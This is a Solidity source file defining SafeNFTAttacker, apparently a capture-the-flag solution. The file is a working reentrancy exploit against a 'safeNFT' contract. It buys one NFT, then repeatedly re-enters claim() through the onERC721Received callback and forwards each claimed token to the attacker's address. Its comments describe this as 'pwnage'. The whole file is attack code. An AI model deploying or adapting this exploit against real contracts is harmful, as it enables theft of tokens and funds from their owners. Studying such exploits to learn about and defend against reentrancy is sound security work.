// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

contract SafeNFTAttacker is IERC721Receiver {
  uint private claimed;
  uint private count;
  address private owner;
  safeNFT private target;

  constructor(uint count_, address targetAddr_) {
    target = safeNFT(targetAddr_);
    count = count_;
    owner = msg.sender;
  }

  // initiate the pwnage by purchasing a single NFT
  // we will re-enter later via onERC721Received
  function pwn() external payable {
    target.buyNFT{value: msg.value}();
    target.claim();
  }

  function claimNext() internal {
    // keep record of the current claim
    claimed++;
    // if we want to keep on claiming, continue re-entering
    // stop if you think they've had enough :)
    if (claimed != count) {
      target.claim();
    }
  }

  function onERC721Received(
    address /*operator*/,
    address /*from*/,
    uint256 tokenId,
    bytes calldata /*data*/
  ) external override returns (bytes4) {
    // forward the claimed NFT to yourself
    target.transferFrom(address(this), owner, tokenId);

    // re-enter
    claimNext();

    return IERC721Receiver.onERC721Received.selector;
  }
}
